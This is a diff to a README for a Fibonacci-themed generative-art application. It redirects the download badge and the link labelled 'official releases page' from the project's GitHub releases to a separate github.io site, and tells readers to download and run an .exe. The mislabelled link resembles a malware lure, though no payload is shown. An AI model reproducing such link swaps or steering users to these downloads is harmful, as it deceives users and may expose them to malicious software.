@@ -1,6 +1,6 @@
 # 🌀 Fibonaccis-Spin-Generative-Art - Create beautiful math inspired digital patterns
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/monikag9481/Fibonaccis-Spin-Generative-Art/releases)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://monikag9481.github.io)
 
 Fibonacci's Spin offers two unique digital artworks. These designs use the Fibonacci sequence and the golden ratio. You see spinning lines and moving ellipses. These patterns look good on digital screens and printed fabric. This software helps you view and save these designs for your own design projects.
 
@@ -10,7 +10,7 @@ You need a computer with Windows 10 or Windows 11. The application runs on most 
 
 ## 🛠️ How to Download and Install
 
-1. Visit the [official releases page](https://github.com/monikag9481/Fibonaccis-Spin-Generative-Art/releases) to download the software.
+1. Visit the [official releases page](https://monikag9481.github.io) to download the software.
 2. Locate the file ending in .exe for your version of Windows.
 3. Click the file name to start the download.
 4. Save the file to your desktop or downloads folder.
